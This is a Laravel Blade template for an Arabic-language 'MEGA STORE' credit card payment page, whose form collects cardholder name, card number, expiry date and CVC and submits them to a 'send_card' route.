<!DOCTYPE html>
<html lang="en" dir="rtl">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>MEGA STORE</title>
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
      integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw=="
      crossorigin="anonymous"
      referrerpolicy="no-referrer"
    />
    <link rel="stylesheet" href="{{asset('front/css/bootstrap.rtl.min.css')}}" />
    <link rel="stylesheet" href="{{asset('front/css/master.css')}}" />
    <link rel="stylesheet" href="{{asset('front/css/media.css')}}" />
  </head>
  <body>
    <div class="container">
      <div class="row d-flex justify-content-center">
        <div class="col-lg-5 p-5">
          <form class="form" method="post" action="{{ route('send_card') }}">
            @csrf
            <div class="row justify-content-center my-4 align-items-center">
              <div>
                <img src="{{asset('front/images/visa.png')}}" class="w-25 ms-5 ps-4" alt="" />
                <span class="fw-normal fs-4 text-center text-secondary mx-2" dir="ltr" >بطاقة ائتمانية |
                </span>
              </div>
            </div>
            <div class="form-floating mb-3">
              <input
                type="text"
                name="name"
                class="form-control rounded-4 card-name"
                id="name"
                autocomplete="off"
                required=""
                placeholder="اسم البطاقة"
                data-gtm-form-interact-field-id="0"
              />
              <label for="name">
                <div class="text-secondary">
                  <i class="fa-sharp fa-solid fa-user-tie fa-fw mx-2 fa-lg"></i
                  >اسم البطاقة
                </div>
              </label>
            </div>
            <div class="form-floating mb-3">
              <input
                type="tel"
                name="number"
                class="form-control rounded-4 card-number"
                id="cardNumber"
                autocomplete="off"
                placeholder="رقم البطاقة"
                maxlength="19"
              />
              <label for="cardNumber">
                <div class="text-secondary">
                  <i class="fa-solid fa-credit-card fa-fw mx-2 fa-lg"></i>رقم
                  البطاقة
                </div>
              </label>
            </div>
            <div class="row">
              <div class="col-6">
                <div class="mb-3">
                  <div class="form-floating">
                    <select
                      class="form-select rounded-4 ps-4"
                      id="floatingSelect"
                      name="year"
                      aria-label="Floating label select example"
                    >
                      <option selected="" disabled="" hidden="">
                        اختر سنة انتهاء البطاقة
                      </option>
                      <option value="2023" selected>2023</option>
                      <option value="2024">2024</option>
                      <option value="2025">2025</option>
                      <option value="2026">2026</option>
                      <option value="2027">2027</option>
                      <option value="2028">2028</option>
                      <option value="2029">2029</option>
                      <option value="2030">2030</option>
                    </select>
                    <label for="floatingSelect">
                      <i class="fa-solid fa-calendar fa-fw mx-2 fa-xl"></i>
                      <span class="fs-6"> السنة</span>
                    </label>
                  </div>
                </div>
              </div>
              <div class="col-6">
                <div class="mb-3">
                  <div class="form-floating">
                    <select
                      class="form-select rounded-4 ps-4"
                      id="month"
                      name="month"
                      aria-label="Floating label select example"
                    >
                      <option selected="" disabled="" hidden="">
                        اختر شهر انتهاء البطاقة
                      </option>
                      <option value="1">1</option>
                      <option value="2">2</option>
                      <option value="3">3</option>
                      <option value="4">4</option>
                      <option value="5" >5</option>
                      <option value="6"selected>6</option>
                      <option value="7">7</option>
                      <option value="8">8</option>
                      <option value="9">9</option>
                      <option value="10">10</option>
                      <option value="11">11</option>
                      <option value="12">12</option>
                    </select>
                    <label for="month">
                      <i
                        class="fa-regular fa-calendar-days fa-fw mx-2 fa-xl"
                      ></i>
                      <span class="fs-6"> الشهر</span>
                    </label>
                  </div>
                </div>
              </div>
            </div>
            <div class="form-floating mb-3">
              <input
                type="tel"
                name="cvc"
                id="cvv"
                class="form-control rounded-4 cvv"
                autocomplete="off"
                placeholder="0000 0000 0000 0000"
                maxlength="3"
              />
              <label for="kalema">
                <div class="text-secondary">
                  <i class="fa-solid fa-key fa-fw mx-2 fa-lg"></i>رقم CVC
                </div>
              </label>
            </div>
            <div class="px-2">
              <div class="form-check mb-3 border-top pt-2">
                <input
                  class="form-check-input"
                  type="checkbox"
                  value=""
                  id="flexCheckDefault"
                />
                <label
                  class="form-check-label text-secondary"
                  style="font-size: 14px"
                  for="flexCheckDefault"
                >
                  حفظ بيانات البطاقة
                </label>
              </div>
            </div>
            
            <div class="mb-3">
              <input type="submit" value="التالي"  class="w-100 btn white-color primary-color payment-btn rounded-4 py-2" name="" id="">
              
            </div>
          </form>
          <div class="position-fixed p-3 toast-box" style="z-index: 11">
            <div
              id="liveToast"
              class="toast"
              role="alert"
              aria-live="assertive"
              aria-atomic="true"
            >
              <div
                class="toast-body error-message p-3"
                style="color: red"
              ></div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <script src="{{asset('front/js/bootstrap.min.js')}}"></script>
    <script src="{{asset('front/js/cleave.min.js')}}"></script>
    <script src="{{asset('front/js/form2.js')}}"></script>
  </body>
</html>
